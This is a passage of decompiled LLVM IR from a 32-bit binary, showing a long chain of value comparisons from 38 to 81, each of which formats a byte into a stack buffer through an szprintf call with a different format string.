dec_label_pc_10003fec:                            ; preds = %dec_label_pc_10003f98, %dec_label_pc_10003fa4
  %v3_10003ff0 = icmp eq i32 %v2_10003364, 38
  br i1 %v3_10003ff0, label %dec_label_pc_10003ff8, label %dec_label_pc_10004040

dec_label_pc_10003ff8:                            ; preds = %dec_label_pc_10003fec
  %v2_10003ff8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000400c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000400c = zext i8 %v3_1000400c to i32
  %v4_1000403c = call i32 @szprintf(i32 %v2_10003ff8, i32 ptrtoint ([13 x i8]* @global_var_10015300.94 to i32), i32 %v4_1000400c)
  br label %dec_label_pc_10004040

dec_label_pc_10004040:                            ; preds = %dec_label_pc_10003fec, %dec_label_pc_10003ff8
  %v3_10004044 = icmp eq i32 %v2_10003364, 39
  br i1 %v3_10004044, label %dec_label_pc_1000404c, label %dec_label_pc_10004094

dec_label_pc_1000404c:                            ; preds = %dec_label_pc_10004040
  %v2_1000404c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004060 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004060 = zext i8 %v3_10004060 to i32
  %v4_10004090 = call i32 @szprintf(i32 %v2_1000404c, i32 ptrtoint ([13 x i8]* @global_var_10015310.95 to i32), i32 %v4_10004060)
  br label %dec_label_pc_10004094

dec_label_pc_10004094:                            ; preds = %dec_label_pc_10004040, %dec_label_pc_1000404c
  %v3_10004098 = icmp eq i32 %v2_10003364, 40
  br i1 %v3_10004098, label %dec_label_pc_100040a0, label %dec_label_pc_100040e8

dec_label_pc_100040a0:                            ; preds = %dec_label_pc_10004094
  %v2_100040a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100040b4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100040b4 = zext i8 %v3_100040b4 to i32
  %v4_100040e4 = call i32 @szprintf(i32 %v2_100040a0, i32 ptrtoint ([13 x i8]* @global_var_10015300.94 to i32), i32 %v4_100040b4)
  br label %dec_label_pc_100040e8

dec_label_pc_100040e8:                            ; preds = %dec_label_pc_10004094, %dec_label_pc_100040a0
  %v3_100040ec = icmp eq i32 %v2_10003364, 41
  br i1 %v3_100040ec, label %dec_label_pc_100040f4, label %dec_label_pc_1000413c

dec_label_pc_100040f4:                            ; preds = %dec_label_pc_100040e8
  %v2_100040f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004108 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004108 = zext i8 %v3_10004108 to i32
  %v4_10004138 = call i32 @szprintf(i32 %v2_100040f4, i32 ptrtoint ([13 x i8]* @global_var_10015320.96 to i32), i32 %v4_10004108)
  br label %dec_label_pc_1000413c

dec_label_pc_1000413c:                            ; preds = %dec_label_pc_100040e8, %dec_label_pc_100040f4
  %v3_10004140 = icmp eq i32 %v2_10003364, 42
  br i1 %v3_10004140, label %dec_label_pc_10004148, label %dec_label_pc_10004190

dec_label_pc_10004148:                            ; preds = %dec_label_pc_1000413c
  %v2_10004148 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000415c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000415c = zext i8 %v3_1000415c to i32
  %v4_1000418c = call i32 @szprintf(i32 %v2_10004148, i32 ptrtoint ([13 x i8]* @global_var_10015330.97 to i32), i32 %v4_1000415c)
  br label %dec_label_pc_10004190

dec_label_pc_10004190:                            ; preds = %dec_label_pc_1000413c, %dec_label_pc_10004148
  %v3_10004194 = icmp eq i32 %v2_10003364, 43
  br i1 %v3_10004194, label %dec_label_pc_1000419c, label %dec_label_pc_100041e4

dec_label_pc_1000419c:                            ; preds = %dec_label_pc_10004190
  %v2_1000419c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100041b0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100041b0 = zext i8 %v3_100041b0 to i32
  %v4_100041e0 = call i32 @szprintf(i32 %v2_1000419c, i32 ptrtoint ([13 x i8]* @global_var_10015340.98 to i32), i32 %v4_100041b0)
  br label %dec_label_pc_100041e4

dec_label_pc_100041e4:                            ; preds = %dec_label_pc_10004190, %dec_label_pc_1000419c
  %v3_100041e8 = icmp eq i32 %v2_10003364, 44
  br i1 %v3_100041e8, label %dec_label_pc_100041f0, label %dec_label_pc_10004238

dec_label_pc_100041f0:                            ; preds = %dec_label_pc_100041e4
  %v2_100041f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004204 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004204 = zext i8 %v3_10004204 to i32
  %v4_10004234 = call i32 @szprintf(i32 %v2_100041f0, i32 ptrtoint ([13 x i8]* @global_var_10015330.97 to i32), i32 %v4_10004204)
  br label %dec_label_pc_10004238

dec_label_pc_10004238:                            ; preds = %dec_label_pc_100041e4, %dec_label_pc_100041f0
  %v3_1000423c = icmp eq i32 %v2_10003364, 45
  br i1 %v3_1000423c, label %dec_label_pc_10004244, label %dec_label_pc_1000428c

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004238
  %v2_10004244 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004258 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004258 = zext i8 %v3_10004258 to i32
  %v4_10004288 = call i32 @szprintf(i32 %v2_10004244, i32 ptrtoint ([13 x i8]* @global_var_10015350.99 to i32), i32 %v4_10004258)
  br label %dec_label_pc_1000428c

dec_label_pc_1000428c:                            ; preds = %dec_label_pc_10004238, %dec_label_pc_10004244
  %v3_10004290 = icmp eq i32 %v2_10003364, 46
  br i1 %v3_10004290, label %dec_label_pc_10004298, label %dec_label_pc_100042e0

dec_label_pc_10004298:                            ; preds = %dec_label_pc_1000428c
  %v2_10004298 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100042ac = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100042ac = zext i8 %v3_100042ac to i32
  %v4_100042dc = call i32 @szprintf(i32 %v2_10004298, i32 ptrtoint ([13 x i8]* @global_var_10015360.100 to i32), i32 %v4_100042ac)
  br label %dec_label_pc_100042e0

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_1000428c, %dec_label_pc_10004298
  %v3_100042e4 = icmp eq i32 %v2_10003364, 47
  br i1 %v3_100042e4, label %dec_label_pc_100042ec, label %dec_label_pc_10004334

dec_label_pc_100042ec:                            ; preds = %dec_label_pc_100042e0
  %v2_100042ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004300 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004300 = zext i8 %v3_10004300 to i32
  %v4_10004330 = call i32 @szprintf(i32 %v2_100042ec, i32 ptrtoint ([13 x i8]* @global_var_10015370.101 to i32), i32 %v4_10004300)
  br label %dec_label_pc_10004334

dec_label_pc_10004334:                            ; preds = %dec_label_pc_100042e0, %dec_label_pc_100042ec
  %v3_10004338 = icmp eq i32 %v2_10003364, 48
  br i1 %v3_10004338, label %dec_label_pc_10004340, label %dec_label_pc_10004388

dec_label_pc_10004340:                            ; preds = %dec_label_pc_10004334
  %v2_10004340 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004354 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004354 = zext i8 %v3_10004354 to i32
  %v4_10004384 = call i32 @szprintf(i32 %v2_10004340, i32 ptrtoint ([13 x i8]* @global_var_10015380.102 to i32), i32 %v4_10004354)
  br label %dec_label_pc_10004388

dec_label_pc_10004388:                            ; preds = %dec_label_pc_10004334, %dec_label_pc_10004340
  %v3_1000438c = icmp eq i32 %v2_10003364, 49
  br i1 %v3_1000438c, label %dec_label_pc_10004394, label %dec_label_pc_100043dc

dec_label_pc_10004394:                            ; preds = %dec_label_pc_10004388
  %v2_10004394 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043a8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100043a8 = zext i8 %v3_100043a8 to i32
  %v4_100043d8 = call i32 @szprintf(i32 %v2_10004394, i32 ptrtoint ([13 x i8]* @global_var_10015390.103 to i32), i32 %v4_100043a8)
  br label %dec_label_pc_100043dc

dec_label_pc_100043dc:                            ; preds = %dec_label_pc_10004388, %dec_label_pc_10004394
  %v3_100043e0 = icmp eq i32 %v2_10003364, 50
  br i1 %v3_100043e0, label %dec_label_pc_100043e8, label %dec_label_pc_10004430

dec_label_pc_100043e8:                            ; preds = %dec_label_pc_100043dc
  %v2_100043e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100043fc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100043fc = zext i8 %v3_100043fc to i32
  %v4_1000442c = call i32 @szprintf(i32 %v2_100043e8, i32 ptrtoint ([14 x i8]* @global_var_100153a0.104 to i32), i32 %v4_100043fc)
  br label %dec_label_pc_10004430

dec_label_pc_10004430:                            ; preds = %dec_label_pc_100043dc, %dec_label_pc_100043e8
  %v3_10004434 = icmp eq i32 %v2_10003364, 51
  br i1 %v3_10004434, label %dec_label_pc_1000443c, label %dec_label_pc_10004484

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_10004430
  %v2_1000443c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004450 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004450 = zext i8 %v3_10004450 to i32
  %v4_10004480 = call i32 @szprintf(i32 %v2_1000443c, i32 ptrtoint ([14 x i8]* @global_var_100153b0.105 to i32), i32 %v4_10004450)
  br label %dec_label_pc_10004484

dec_label_pc_10004484:                            ; preds = %dec_label_pc_10004430, %dec_label_pc_1000443c
  %v3_10004488 = icmp eq i32 %v2_10003364, 52
  br i1 %v3_10004488, label %dec_label_pc_10004490, label %dec_label_pc_100044d8

dec_label_pc_10004490:                            ; preds = %dec_label_pc_10004484
  %v2_10004490 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044a4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100044a4 = zext i8 %v3_100044a4 to i32
  %v4_100044d4 = call i32 @szprintf(i32 %v2_10004490, i32 ptrtoint ([13 x i8]* @global_var_100153c0.106 to i32), i32 %v4_100044a4)
  br label %dec_label_pc_100044d8

dec_label_pc_100044d8:                            ; preds = %dec_label_pc_10004484, %dec_label_pc_10004490
  %v3_100044dc = icmp eq i32 %v2_10003364, 53
  br i1 %v3_100044dc, label %dec_label_pc_100044e4, label %dec_label_pc_1000452c

dec_label_pc_100044e4:                            ; preds = %dec_label_pc_100044d8
  %v2_100044e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100044f8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100044f8 = zext i8 %v3_100044f8 to i32
  %v4_10004528 = call i32 @szprintf(i32 %v2_100044e4, i32 ptrtoint ([14 x i8]* @global_var_100153d0.107 to i32), i32 %v4_100044f8)
  br label %dec_label_pc_1000452c

dec_label_pc_1000452c:                            ; preds = %dec_label_pc_100044d8, %dec_label_pc_100044e4
  %v3_10004530 = icmp eq i32 %v2_10003364, 54
  br i1 %v3_10004530, label %dec_label_pc_10004538, label %dec_label_pc_10004580

dec_label_pc_10004538:                            ; preds = %dec_label_pc_1000452c
  %v2_10004538 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000454c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000454c = zext i8 %v3_1000454c to i32
  %v4_1000457c = call i32 @szprintf(i32 %v2_10004538, i32 ptrtoint ([15 x i8]* @global_var_100153e0.108 to i32), i32 %v4_1000454c)
  br label %dec_label_pc_10004580

dec_label_pc_10004580:                            ; preds = %dec_label_pc_1000452c, %dec_label_pc_10004538
  %v3_10004584 = icmp eq i32 %v2_10003364, 55
  br i1 %v3_10004584, label %dec_label_pc_1000458c, label %dec_label_pc_100045d4

dec_label_pc_1000458c:                            ; preds = %dec_label_pc_10004580
  %v2_1000458c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045a0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100045a0 = zext i8 %v3_100045a0 to i32
  %v4_100045d0 = call i32 @szprintf(i32 %v2_1000458c, i32 ptrtoint ([14 x i8]* @global_var_100153f0.109 to i32), i32 %v4_100045a0)
  br label %dec_label_pc_100045d4

dec_label_pc_100045d4:                            ; preds = %dec_label_pc_10004580, %dec_label_pc_1000458c
  %v3_100045d8 = icmp eq i32 %v2_10003364, 56
  br i1 %v3_100045d8, label %dec_label_pc_100045e0, label %dec_label_pc_10004628

dec_label_pc_100045e0:                            ; preds = %dec_label_pc_100045d4
  %v2_100045e0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100045f4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100045f4 = zext i8 %v3_100045f4 to i32
  %v4_10004624 = call i32 @szprintf(i32 %v2_100045e0, i32 ptrtoint ([14 x i8]* @global_var_10015400.110 to i32), i32 %v4_100045f4)
  br label %dec_label_pc_10004628

dec_label_pc_10004628:                            ; preds = %dec_label_pc_100045d4, %dec_label_pc_100045e0
  %v3_1000462c = icmp eq i32 %v2_10003364, 57
  br i1 %v3_1000462c, label %dec_label_pc_10004634, label %dec_label_pc_1000467c

dec_label_pc_10004634:                            ; preds = %dec_label_pc_10004628
  %v2_10004634 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004648 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004648 = zext i8 %v3_10004648 to i32
  %v4_10004678 = call i32 @szprintf(i32 %v2_10004634, i32 ptrtoint ([13 x i8]* @global_var_10015410.111 to i32), i32 %v4_10004648)
  br label %dec_label_pc_1000467c

dec_label_pc_1000467c:                            ; preds = %dec_label_pc_10004628, %dec_label_pc_10004634
  %v3_10004680 = icmp eq i32 %v2_10003364, 58
  br i1 %v3_10004680, label %dec_label_pc_10004688, label %dec_label_pc_100046d0

dec_label_pc_10004688:                            ; preds = %dec_label_pc_1000467c
  %v2_10004688 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000469c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000469c = zext i8 %v3_1000469c to i32
  %v4_100046cc = call i32 @szprintf(i32 %v2_10004688, i32 ptrtoint ([14 x i8]* @global_var_10015420.112 to i32), i32 %v4_1000469c)
  br label %dec_label_pc_100046d0

dec_label_pc_100046d0:                            ; preds = %dec_label_pc_1000467c, %dec_label_pc_10004688
  %v3_100046d4 = icmp eq i32 %v2_10003364, 59
  br i1 %v3_100046d4, label %dec_label_pc_100046dc, label %dec_label_pc_10004724

dec_label_pc_100046dc:                            ; preds = %dec_label_pc_100046d0
  %v2_100046dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100046f0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100046f0 = zext i8 %v3_100046f0 to i32
  %v4_10004720 = call i32 @szprintf(i32 %v2_100046dc, i32 ptrtoint ([14 x i8]* @global_var_10015430.113 to i32), i32 %v4_100046f0)
  br label %dec_label_pc_10004724

dec_label_pc_10004724:                            ; preds = %dec_label_pc_100046d0, %dec_label_pc_100046dc
  %v3_10004728 = icmp eq i32 %v2_10003364, 60
  br i1 %v3_10004728, label %dec_label_pc_10004730, label %dec_label_pc_10004778

dec_label_pc_10004730:                            ; preds = %dec_label_pc_10004724
  %v2_10004730 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004744 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004744 = zext i8 %v3_10004744 to i32
  %v4_10004774 = call i32 @szprintf(i32 %v2_10004730, i32 ptrtoint ([14 x i8]* @global_var_10015440.114 to i32), i32 %v4_10004744)
  br label %dec_label_pc_10004778

dec_label_pc_10004778:                            ; preds = %dec_label_pc_10004724, %dec_label_pc_10004730
  %v3_1000477c = icmp eq i32 %v2_10003364, 61
  br i1 %v3_1000477c, label %dec_label_pc_10004784, label %dec_label_pc_100047cc

dec_label_pc_10004784:                            ; preds = %dec_label_pc_10004778
  %v2_10004784 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004798 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004798 = zext i8 %v3_10004798 to i32
  %v4_100047c8 = call i32 @szprintf(i32 %v2_10004784, i32 ptrtoint ([14 x i8]* @global_var_10015450.115 to i32), i32 %v4_10004798)
  br label %dec_label_pc_100047cc

dec_label_pc_100047cc:                            ; preds = %dec_label_pc_10004778, %dec_label_pc_10004784
  %v3_100047d0 = icmp eq i32 %v2_10003364, 62
  br i1 %v3_100047d0, label %dec_label_pc_100047d8, label %dec_label_pc_10004820

dec_label_pc_100047d8:                            ; preds = %dec_label_pc_100047cc
  %v2_100047d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100047ec = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100047ec = zext i8 %v3_100047ec to i32
  %v4_1000481c = call i32 @szprintf(i32 %v2_100047d8, i32 ptrtoint ([14 x i8]* @global_var_10015460.116 to i32), i32 %v4_100047ec)
  br label %dec_label_pc_10004820

dec_label_pc_10004820:                            ; preds = %dec_label_pc_100047cc, %dec_label_pc_100047d8
  %v3_10004824 = icmp eq i32 %v2_10003364, 63
  br i1 %v3_10004824, label %dec_label_pc_1000482c, label %dec_label_pc_10004874

dec_label_pc_1000482c:                            ; preds = %dec_label_pc_10004820
  %v2_1000482c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004840 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004840 = zext i8 %v3_10004840 to i32
  %v4_10004870 = call i32 @szprintf(i32 %v2_1000482c, i32 ptrtoint ([14 x i8]* @global_var_10015470.117 to i32), i32 %v4_10004840)
  br label %dec_label_pc_10004874

dec_label_pc_10004874:                            ; preds = %dec_label_pc_10004820, %dec_label_pc_1000482c
  %v3_10004878 = icmp eq i32 %v2_10003364, 64
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_100048c8

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004874
  %v2_10004880 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004894 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004894 = zext i8 %v3_10004894 to i32
  %v4_100048c4 = call i32 @szprintf(i32 %v2_10004880, i32 ptrtoint ([14 x i8]* @global_var_10015480.118 to i32), i32 %v4_10004894)
  br label %dec_label_pc_100048c8

dec_label_pc_100048c8:                            ; preds = %dec_label_pc_10004874, %dec_label_pc_10004880
  %v3_100048cc = icmp eq i32 %v2_10003364, 65
  br i1 %v3_100048cc, label %dec_label_pc_100048d4, label %dec_label_pc_1000491c

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_100048c8
  %v2_100048d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100048e8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100048e8 = zext i8 %v3_100048e8 to i32
  %v4_10004918 = call i32 @szprintf(i32 %v2_100048d4, i32 ptrtoint ([14 x i8]* @global_var_10015490.119 to i32), i32 %v4_100048e8)
  br label %dec_label_pc_1000491c

dec_label_pc_1000491c:                            ; preds = %dec_label_pc_100048c8, %dec_label_pc_100048d4
  %v3_10004920 = icmp eq i32 %v2_10003364, 66
  br i1 %v3_10004920, label %dec_label_pc_10004928, label %dec_label_pc_10004970

dec_label_pc_10004928:                            ; preds = %dec_label_pc_1000491c
  %v2_10004928 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000493c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000493c = zext i8 %v3_1000493c to i32
  %v4_1000496c = call i32 @szprintf(i32 %v2_10004928, i32 ptrtoint ([14 x i8]* @global_var_100154a0.120 to i32), i32 %v4_1000493c)
  br label %dec_label_pc_10004970

dec_label_pc_10004970:                            ; preds = %dec_label_pc_1000491c, %dec_label_pc_10004928
  %v3_10004974 = icmp eq i32 %v2_10003364, 67
  br i1 %v3_10004974, label %dec_label_pc_1000497c, label %dec_label_pc_100049c4

dec_label_pc_1000497c:                            ; preds = %dec_label_pc_10004970
  %v2_1000497c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004990 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004990 = zext i8 %v3_10004990 to i32
  %v4_100049c0 = call i32 @szprintf(i32 %v2_1000497c, i32 ptrtoint ([14 x i8]* @global_var_100154b0.121 to i32), i32 %v4_10004990)
  br label %dec_label_pc_100049c4

dec_label_pc_100049c4:                            ; preds = %dec_label_pc_10004970, %dec_label_pc_1000497c
  %v3_100049c8 = icmp eq i32 %v2_10003364, 68
  br i1 %v3_100049c8, label %dec_label_pc_100049d0, label %dec_label_pc_10004a18

dec_label_pc_100049d0:                            ; preds = %dec_label_pc_100049c4
  %v2_100049d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100049e4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100049e4 = zext i8 %v3_100049e4 to i32
  %v4_10004a14 = call i32 @szprintf(i32 %v2_100049d0, i32 ptrtoint ([14 x i8]* @global_var_100154c0.122 to i32), i32 %v4_100049e4)
  br label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_100049c4, %dec_label_pc_100049d0
  %v3_10004a1c = icmp eq i32 %v2_10003364, 69
  br i1 %v3_10004a1c, label %dec_label_pc_10004a24, label %dec_label_pc_10004a6c

dec_label_pc_10004a24:                            ; preds = %dec_label_pc_10004a18
  %v2_10004a24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a38 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004a38 = zext i8 %v3_10004a38 to i32
  %v4_10004a68 = call i32 @szprintf(i32 %v2_10004a24, i32 ptrtoint ([14 x i8]* @global_var_100154d0.123 to i32), i32 %v4_10004a38)
  br label %dec_label_pc_10004a6c

dec_label_pc_10004a6c:                            ; preds = %dec_label_pc_10004a18, %dec_label_pc_10004a24
  %v3_10004a70 = icmp eq i32 %v2_10003364, 70
  br i1 %v3_10004a70, label %dec_label_pc_10004a78, label %dec_label_pc_10004ac0

dec_label_pc_10004a78:                            ; preds = %dec_label_pc_10004a6c
  %v2_10004a78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004a8c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004a8c = zext i8 %v3_10004a8c to i32
  %v4_10004abc = call i32 @szprintf(i32 %v2_10004a78, i32 ptrtoint ([14 x i8]* @global_var_100154e0.124 to i32), i32 %v4_10004a8c)
  br label %dec_label_pc_10004ac0

dec_label_pc_10004ac0:                            ; preds = %dec_label_pc_10004a6c, %dec_label_pc_10004a78
  %v3_10004ac4 = icmp eq i32 %v2_10003364, 71
  br i1 %v3_10004ac4, label %dec_label_pc_10004acc, label %dec_label_pc_10004b14

dec_label_pc_10004acc:                            ; preds = %dec_label_pc_10004ac0
  %v2_10004acc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ae0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004ae0 = zext i8 %v3_10004ae0 to i32
  %v4_10004b10 = call i32 @szprintf(i32 %v2_10004acc, i32 ptrtoint ([14 x i8]* @global_var_100154f0.125 to i32), i32 %v4_10004ae0)
  br label %dec_label_pc_10004b14

dec_label_pc_10004b14:                            ; preds = %dec_label_pc_10004ac0, %dec_label_pc_10004acc
  %v3_10004b18 = icmp eq i32 %v2_10003364, 72
  br i1 %v3_10004b18, label %dec_label_pc_10004b20, label %dec_label_pc_10004b68

dec_label_pc_10004b20:                            ; preds = %dec_label_pc_10004b14
  %v2_10004b20 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b34 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004b34 = zext i8 %v3_10004b34 to i32
  %v4_10004b64 = call i32 @szprintf(i32 %v2_10004b20, i32 ptrtoint ([14 x i8]* @global_var_10015500.126 to i32), i32 %v4_10004b34)
  br label %dec_label_pc_10004b68

dec_label_pc_10004b68:                            ; preds = %dec_label_pc_10004b14, %dec_label_pc_10004b20
  %v3_10004b6c = icmp eq i32 %v2_10003364, 73
  br i1 %v3_10004b6c, label %dec_label_pc_10004b74, label %dec_label_pc_10004bbc

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b68
  %v2_10004b74 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004b88 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004b88 = zext i8 %v3_10004b88 to i32
  %v4_10004bb8 = call i32 @szprintf(i32 %v2_10004b74, i32 ptrtoint ([14 x i8]* @global_var_10015510.127 to i32), i32 %v4_10004b88)
  br label %dec_label_pc_10004bbc

dec_label_pc_10004bbc:                            ; preds = %dec_label_pc_10004b68, %dec_label_pc_10004b74
  %v3_10004bc0 = icmp eq i32 %v2_10003364, 74
  br i1 %v3_10004bc0, label %dec_label_pc_10004bc8, label %dec_label_pc_10004c10

dec_label_pc_10004bc8:                            ; preds = %dec_label_pc_10004bbc
  %v2_10004bc8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004bdc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004bdc = zext i8 %v3_10004bdc to i32
  %v4_10004c0c = call i32 @szprintf(i32 %v2_10004bc8, i32 ptrtoint ([14 x i8]* @global_var_10015520.128 to i32), i32 %v4_10004bdc)
  br label %dec_label_pc_10004c10

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004bbc, %dec_label_pc_10004bc8
  %v3_10004c14 = icmp eq i32 %v2_10003364, 75
  br i1 %v3_10004c14, label %dec_label_pc_10004c1c, label %dec_label_pc_10004c64

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c10
  %v2_10004c1c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c30 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004c30 = zext i8 %v3_10004c30 to i32
  %v4_10004c60 = call i32 @szprintf(i32 %v2_10004c1c, i32 ptrtoint ([14 x i8]* @global_var_10015510.127 to i32), i32 %v4_10004c30)
  br label %dec_label_pc_10004c64

dec_label_pc_10004c64:                            ; preds = %dec_label_pc_10004c10, %dec_label_pc_10004c1c
  %v3_10004c68 = icmp eq i32 %v2_10003364, 76
  br i1 %v3_10004c68, label %dec_label_pc_10004c70, label %dec_label_pc_10004cb8

dec_label_pc_10004c70:                            ; preds = %dec_label_pc_10004c64
  %v2_10004c70 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004c84 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004c84 = zext i8 %v3_10004c84 to i32
  %v4_10004cb4 = call i32 @szprintf(i32 %v2_10004c70, i32 ptrtoint ([15 x i8]* @global_var_10015530.129 to i32), i32 %v4_10004c84)
  br label %dec_label_pc_10004cb8

dec_label_pc_10004cb8:                            ; preds = %dec_label_pc_10004c64, %dec_label_pc_10004c70
  %v3_10004cbc = icmp eq i32 %v2_10003364, 77
  br i1 %v3_10004cbc, label %dec_label_pc_10004cc4, label %dec_label_pc_10004d0c

dec_label_pc_10004cc4:                            ; preds = %dec_label_pc_10004cb8
  %v2_10004cc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004cd8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004cd8 = zext i8 %v3_10004cd8 to i32
  %v4_10004d08 = call i32 @szprintf(i32 %v2_10004cc4, i32 ptrtoint ([14 x i8]* @global_var_10015540.130 to i32), i32 %v4_10004cd8)
  br label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cb8, %dec_label_pc_10004cc4
  %v3_10004d10 = icmp eq i32 %v2_10003364, 78
  br i1 %v3_10004d10, label %dec_label_pc_10004d18, label %dec_label_pc_10004d60

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004d0c
  %v2_10004d18 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d2c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004d2c = zext i8 %v3_10004d2c to i32
  %v4_10004d5c = call i32 @szprintf(i32 %v2_10004d18, i32 ptrtoint ([14 x i8]* @global_var_10015550.131 to i32), i32 %v4_10004d2c)
  br label %dec_label_pc_10004d60

dec_label_pc_10004d60:                            ; preds = %dec_label_pc_10004d0c, %dec_label_pc_10004d18
  %v3_10004d64 = icmp eq i32 %v2_10003364, 79
  br i1 %v3_10004d64, label %dec_label_pc_10004d6c, label %dec_label_pc_10004db4

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d60
  %v2_10004d6c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004d80 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004d80 = zext i8 %v3_10004d80 to i32
  %v4_10004db0 = call i32 @szprintf(i32 %v2_10004d6c, i32 ptrtoint ([16 x i8]* @global_var_10015560.132 to i32), i32 %v4_10004d80)
  br label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d60, %dec_label_pc_10004d6c
  %v3_10004db8 = icmp eq i32 %v2_10003364, 80
  br i1 %v3_10004db8, label %dec_label_pc_10004dc0, label %dec_label_pc_10004e08

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004db4
  %v2_10004dc0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004dd4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10004dd4 = zext i8 %v3_10004dd4 to i32
  %v4_10004e04 = call i32 @szprintf(i32 %v2_10004dc0, i32 ptrtoint ([14 x i8]* @global_var_10015570.133 to i32), i32 %v4_10004dd4)
  br label %dec_label_pc_10004e08

dec_label_pc_10004e08:                            ; preds = %dec_label_pc_10004db4, %dec_label_pc_10004dc0
  %v3_10004e0c = icmp eq i32 %v2_10003364, 81
  br i1 %v3_10004e0c, label %dec_label_pc_10004e14, label %dec_label_pc_10004e5c

dec_label_pc_10004e14:                            ; preds = %dec_label_pc_10004e08
  %v2_10004e14 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e28 = load i8, i8* @global_var_100285cb.54, align 1
